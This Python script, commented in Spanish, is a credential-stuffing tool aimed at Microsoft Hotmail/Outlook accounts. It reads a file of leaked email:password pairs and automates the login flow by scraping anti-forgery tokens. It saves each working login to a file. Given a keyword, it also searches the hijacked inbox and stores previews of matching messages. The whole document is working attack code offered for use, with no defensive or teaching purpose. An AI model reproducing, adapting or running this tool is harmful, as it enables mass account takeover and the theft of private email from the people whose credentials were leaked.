#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Hotmail Checker & Inbox Scanner
Basado en el script original de @PROO_IS_BACK
"""

import requests
import re
import urllib.parse
from typing import Dict, Optional, Tuple
import json
from colorama import Fore, Style, init

# Inicializar colorama
init(autoreset=True)

class HotmailChecker:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0'
        })
    
    def parse_between(self, text: str, left: str, right: str) -> Optional[str]:
        """Extrae texto entre dos delimitadores"""
        try:
            start = text.find(left)
            if start == -1:
                return None
            start += len(left)
            end = text.find(right, start)
            if end == -1:
                return None
            return text[start:end]
        except:
            return None
    
    def check_account(self, email: str, password: str, keyword: str = "") -> Tuple[str, Dict]:
        """
        Verifica una cuenta de Hotmail y busca palabra clave en el inbox
        Retorna: (status, data)
        status: 'VALID', 'INVALID', 'ERROR', 'HIT'
        """
        try:
            # Paso 1: Obtener página inicial de Outlook
            response = self.session.get('https://outlook.com/oauth', timeout=30)
            
            if response.status_code != 200:
                return 'ERROR', {'message': 'No se pudo acceder a Outlook'}
            
            # Extraer tokens necesarios
            flow_token = self.parse_between(response.text, '"flowToken","', '"')
            canary = self.parse_between(response.text, '"apiCanary":"', '"')
            
            if not flow_token or not canary:
                return 'ERROR', {'message': 'No se pudieron extraer tokens'}
            
            # Paso 2: Verificar si la cuenta existe
            cred_check_url = "https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US"
            cred_payload = {
                "username": email,
                "isOtherIdpSupported": True,
                "checkPhones": False,
                "isRemoteNGCSupported": True,
                "isCookieBannerShown": False,
                "isFidoSupported": True,
                "originalRequest": "",
                "country": "US",
                "forceotclogin": False,
                "isExternalFederationDisallowed": False,
                "isRemoteConnectSupported": False,
                "federationFlags": 0,
                "isSignup": False,
                "flowToken": flow_token,
                "isAccessPassSupported": True,
                "isQrCodePinSupported": True
            }
            
            cred_headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'canary': canary
            }
            
            cred_response = self.session.post(cred_check_url, json=cred_payload, headers=cred_headers, timeout=30)
            
            # Verificar si la cuenta existe
            if 'ThrottleStatus":1' in cred_response.text or 'IfExistsResult":1' in cred_response.text:
                return 'INVALID', {'message': 'Cuenta no existe'}
            
            if 'PrefCredential":1' in cred_response.text:
                return 'INVALID', {'message': 'Cuenta no existe'}
            
            if 'PrefCredential":6' not in cred_response.text:
                return 'INVALID', {'message': 'Cuenta no válida'}
            
            # Paso 3: Intentar login
            login_url = f"https://outlook.live.com/owa/?username={urllib.parse.quote(email)}&login_hint={urllib.parse.quote(email)}"
            login_response = self.session.get(login_url, allow_redirects=False, timeout=30)
            
            if 'https://login.live.com/login.srf' not in login_response.text and \
               'https://login.live.com/login.srf' not in str(login_response.headers):
                return 'ERROR', {'message': 'Error en redirección de login'}
            
            # Obtener URL de login
            location = login_response.headers.get('Location', '')
            if not location:
                return 'ERROR', {'message': 'No se obtuvo URL de login'}
            
            # Extraer RpsCsrfState
            set_cookie = login_response.headers.get('Set-Cookie', '')
            rps_csrf = self.parse_between(set_cookie, 'RpsCsrfState.', ';')
            
            # Paso 4: Obtener página de login
            login_page = self.session.get(location, timeout=30)
            
            # Extraer PPFT token
            ppft = self.parse_between(login_page.text, 'name=\\"PPFT\\" id=\\"', '\\"')
            if ppft:
                ppft_value = self.parse_between(login_page.text, f'name=\\"PPFT\\" id=\\"{ppft}\\" value=\\"', '\\"')
            else:
                return 'ERROR', {'message': 'No se pudo extraer PPFT'}
            
            # Extraer URL de POST
            post_url = self.parse_between(login_page.text, '"urlPostMsa":"', '"')
            if not post_url:
                return 'ERROR', {'message': 'No se pudo extraer URL de POST'}
            
            # Paso 5: Enviar credenciales
            login_data = {
                'ps': '2',
                'psRNGCDefaultType': '',
                'psRNGCEntropy': '',
                'psRNGCSLK': '',
                'canary': '',
                'ctx': '',
                'hpgrequestid': '',
                'PPFT': ppft_value,
                'PPSX': 'PassportR',
                'NewUser': '1',
                'FoundMSAs': '',
                'fspost': '0',
                'i21': '0',
                'CookieDisclosure': '0',
                'IsFidoSupported': '1',
                'isSignupPost': '0',
                'isRecoveryAttemptPost': '0',
                'i13': '0',
                'login': email,
                'loginfmt': email,
                'type': '11',
                'LoginOptions': '3',
                'lrt': '',
                'lrtPartition': '',
                'hisRegion': '',
                'hisScaleUnit': '',
                'passwd': password
            }
            
            auth_response = self.session.post(post_url, data=login_data, allow_redirects=False, timeout=30)
            
            # Verificar resultado del login
            if 'Your account or password is incorrect' in auth_response.text or \
               "That Microsoft account doesn\\'t exist" in auth_response.text or \
               'Sign in to your Microsoft account' in auth_response.text:
                return 'INVALID', {'message': 'Credenciales incorrectas'}
            
            if '__Host-MSAAUTH' not in str(auth_response.cookies):
                return 'INVALID', {'message': 'Login fallido'}
            
            # Login exitoso
            result = {
                'email': email,
                'password': password,
                'message': 'Cuenta válida'
            }
            
            # Si hay keyword, buscar en inbox
            if keyword:
                inbox_result = self.search_inbox(email, keyword)
                if inbox_result['found']:
                    result['inbox_count'] = inbox_result['count']
                    result['previews'] = inbox_result['previews']
                    return 'HIT', result
            
            return 'VALID', result
            
        except requests.exceptions.Timeout:
            return 'ERROR', {'message': 'Timeout en la conexión'}
        except requests.exceptions.RequestException as e:
            return 'ERROR', {'message': f'Error de red: {str(e)}'}
        except Exception as e:
            return 'ERROR', {'message': f'Error: {str(e)}'}
    
    def search_inbox(self, email: str, keyword: str) -> Dict:
        """Busca una palabra clave en el inbox de la cuenta"""
        try:
            # Obtener access token para API de búsqueda
            # Nota: Esto requiere estar autenticado, los cookies ya están en la sesión
            
            # Extraer información necesaria de las cookies
            anchor_mailbox = self.session.cookies.get('DefaultAnchorMailbox', '')
            
            if not anchor_mailbox:
                return {'found': False, 'count': 0, 'previews': []}
            
            # Construir request de búsqueda
            search_url = "https://outlook.live.com/searchservice/api/v2/query?n=62"
            
            search_payload = {
                "Cvid": "3d0725f2-caa4-63f8-93f6-12d4b33fa945",
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {
                        "Or": [
                            {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                            {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                        ]
                    },
                    "From": 0,
                    "Query": {"QueryString": keyword},
                    "RefiningQueries": None,
                    "Size": 25,
                    "Sort": [
                        {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                        {"Field": "Time", "SortDirection": "Desc"}
                    ],
                    "EnableTopResults": True,
                    "TopResultsCount": 3
                }],
                "QueryAlterationOptions": {
                    "EnableSuggestion": True,
                    "EnableAlteration": True,
                    "SupportedRecourseDisplayTypes": [
                        "Suggestion", "NoResultModification",
                        "NoResultFolderRefinerModification",
                        "NoRequeryModification", "Modification"
                    ]
                },
                "LogicalId": "8b7c0b2a-64b9-f0c6-da81-b4316b8a151f"
            }
            
            search_headers = {
                'Content-Type': 'application/json',
                'X-Anchormailbox': f'PUID:{anchor_mailbox}'
            }
            
            search_response = self.session.post(search_url, json=search_payload, headers=search_headers, timeout=30)
            
            # Parsear resultados
            if 'Total":0' in search_response.text:
                return {'found': False, 'count': 0, 'previews': []}
            
            # Extraer total de resultados
            total_match = re.search(r'Total":(\d+)', search_response.text)
            total_count = int(total_match.group(1)) if total_match else 0
            
            # Extraer previews de mensajes
            previews = re.findall(r'"Preview":"([^"]+)"', search_response.text)
            
            return {
                'found': True,
                'count': total_count,
                'previews': previews[:5]  # Primeros 5 previews
            }
            
        except Exception as e:
            return {'found': False, 'count': 0, 'previews': [], 'error': str(e)}


def print_banner():
    """Imprime el banner de la herramienta"""
    banner = f"""
{Fore.CYAN}╔═══════════════════════════════════════════════════════╗
║         HOTMAIL CHECKER & INBOX SCANNER               ║
║              Basado en script de @PROO_IS_BACK        ║
╚═══════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
    print(banner)


def load_combo_file(filename: str):
    """Carga el archivo de combos (email:password)"""
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip()]
        return lines
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR] Archivo no encontrado: {filename}{Style.RESET_ALL}")
        return []
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Error al leer archivo: {e}{Style.RESET_ALL}")
        return []


def save_result(filename: str, status: str, email: str, password: str, data: Dict):
    """Guarda los resultados en archivos"""
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            if status == 'HIT':
                f.write(f"{email}:{password} | Hits: {data.get('inbox_count', 0)}\n")
                if data.get('previews'):
                    f.write(f"  Previews: {data['previews'][:2]}\n")
            elif status == 'VALID':
                f.write(f"{email}:{password}\n")
    except Exception as e:
        print(f"{Fore.RED}[ERROR] No se pudo guardar resultado: {e}{Style.RESET_ALL}")


def main():
    print_banner()
    
    # Solicitar archivo de combos
    combo_file = input(f"{Fore.YELLOW}[?] Ingresa el nombre del archivo de combos (ej: combos.txt): {Style.RESET_ALL}").strip()
    
    if not combo_file:
        print(f"{Fore.RED}[ERROR] Debes ingresar un archivo de combos{Style.RESET_ALL}")
        return
    
    # Solicitar palabra clave (opcional)
    keyword = input(f"{Fore.YELLOW}[?] Ingresa palabra clave para buscar en inbox (Enter para omitir): {Style.RESET_ALL}").strip()
    
    # Cargar combos
    combos = load_combo_file(combo_file)
    
    if not combos:
        print(f"{Fore.RED}[ERROR] No se pudieron cargar combos del archivo{Style.RESET_ALL}")
        return
    
    print(f"\n{Fore.CYAN}[INFO] Cargados {len(combos)} combos{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[INFO] Iniciando verificación...{Style.RESET_ALL}\n")
    
    # Contadores
    stats = {
        'valid': 0,
        'invalid': 0,
        'hits': 0,
        'errors': 0
    }
    
    checker = HotmailChecker()
    
    for i, combo in enumerate(combos, 1):
        try:
            # Parsear combo
            if ':' not in combo:
                print(f"{Fore.RED}[{i}/{len(combos)}] Formato inválido: {combo}{Style.RESET_ALL}")
                continue
            
            email, password = combo.split(':', 1)
            
            print(f"{Fore.CYAN}[{i}/{len(combos)}] Verificando: {email}{Style.RESET_ALL}", end=' ')
            
            # Verificar cuenta
            status, data = checker.check_account(email, password, keyword)
            
            if status == 'VALID':
                stats['valid'] += 1
                print(f"{Fore.GREEN}✓ VÁLIDA{Style.RESET_ALL}")
                save_result('valid.txt', status, email, password, data)
            
            elif status == 'HIT':
                stats['hits'] += 1
                print(f"{Fore.MAGENTA}★ HIT! ({data.get('inbox_count', 0)} resultados){Style.RESET_ALL}")
                save_result('hits.txt', status, email, password, data)
                save_result('valid.txt', status, email, password, data)
            
            elif status == 'INVALID':
                stats['invalid'] += 1
                print(f"{Fore.RED}✗ INVÁLIDA{Style.RESET_ALL}")
            
            else:  # ERROR
                stats['errors'] += 1
                print(f"{Fore.YELLOW}⚠ ERROR: {data.get('message', 'Desconocido')}{Style.RESET_ALL}")
        
        except KeyboardInterrupt:
            print(f"\n\n{Fore.YELLOW}[!] Detenido por el usuario{Style.RESET_ALL}")
            break
        except Exception as e:
            print(f"{Fore.RED}[ERROR] {str(e)}{Style.RESET_ALL}")
            stats['errors'] += 1
    
    # Mostrar estadísticas finales
    print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════════╗")
    print(f"║                  RESULTADOS FINALES                   ║")
    print(f"╠═══════════════════════════════════════════════════════╣")
    print(f"║  {Fore.GREEN}Válidas: {stats['valid']:<44}{Fore.CYAN}║")
    print(f"║  {Fore.MAGENTA}Hits: {stats['hits']:<47}{Fore.CYAN}║")
    print(f"║  {Fore.RED}Inválidas: {stats['invalid']:<42}{Fore.CYAN}║")
    print(f"║  {Fore.YELLOW}Errores: {stats['errors']:<44}{Fore.CYAN}║")
    print(f"╚═══════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
    
    if stats['valid'] > 0:
        print(f"{Fore.GREEN}[✓] Cuentas válidas guardadas en: valid.txt{Style.RESET_ALL}")
    if stats['hits'] > 0:
        print(f"{Fore.MAGENTA}[★] Hits guardados en: hits.txt{Style.RESET_ALL}")


if __name__ == '__main__':
    main()
